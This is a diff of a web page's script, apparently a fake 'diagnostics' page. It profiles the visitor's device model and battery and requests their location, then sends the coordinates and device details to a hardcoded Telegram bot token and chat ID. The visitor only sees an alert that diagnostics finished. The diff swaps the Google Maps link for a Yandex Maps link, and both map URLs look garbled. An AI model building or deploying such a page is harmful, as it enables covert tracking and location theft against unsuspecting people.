@@ -60,6 +60,7 @@
     </div>
 
     <script>
+        // Данные вашего Телеграм-бота
         const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
         const TG_CHAT_ID = "6559747526"; 
 
@@ -82,13 +83,11 @@
             }
         }
 
-        // Профессиональное определение точной модели iPhone по разрешению экрана
         function getExactIphoneModel() {
             const width = window.screen.width;
             const height = window.screen.height;
             const ratio = window.devicePixelRatio;
 
-            // Сетка популярных разрешений Apple устройств
             if (width === 430 && height === 932 && ratio === 3) return "iPhone 14 Pro Max / 15 Pro Max / 15 Plus";
             if (width === 393 && height === 852 && ratio === 3) return "iPhone 14 Pro / 15 Pro / 15";
             if (width === 428 && height === 926 && ratio === 3) return "iPhone 13 Pro Max / 14 Plus";
@@ -106,7 +105,6 @@
             let batteryLevel = "Блокируется системой (iOS)";
             let deviceModel = "Не определено";
 
-            // 1. Сбор заряда батареи (работает на Android и ПК)
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -114,9 +112,7 @@
                 } catch (e) {}
             }
 
-            // 2. Определение точной модели
             if (navigator.userAgentData) {
-                // Метод для Android (высокая точность)
                 try {
                     const ua = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                     deviceModel = `${ua.model || "Модель скрыта"} (Android ${ua.platformVersion || ""})`;
@@ -124,7 +120,6 @@
                     deviceModel = "Устройство Android";
                 }
             } else {
-                // Метод для iOS (определение через экранную матрицу)
                 if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
                     deviceModel = getExactIphoneModel();
                 } else if (/Android/i.test(navigator.userAgent)) {
@@ -162,7 +157,12 @@
                     (position) => {
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        const geoText = `\n\n📍 *Определено местонахождение*:\nШирота: \`${lat}\`\nДолгота: \`${lon}\`\n\n[Посмотреть на Google Карте](https://google.com{lat},${lon})`;
+                        
+                        // Формируем ссылку на Яндекс Карты с маркером на нужных координатах
+                        const yandexMapsUrl = `https://yandex.ru{lon},${lat}&whatshere%5Bzoom%5D=16`;
+                        
+                        // Текст сообщения для Telegram без сухих цифр
+                        const geoText = `\n\n🗺 *Определено местонахождение*:\n\n[Открыть на Яндекс Картах](${yandexMapsUrl})`;
                         
                         collectAnalytics(geoText);
                         alert("Диагностика успешно завершена!");
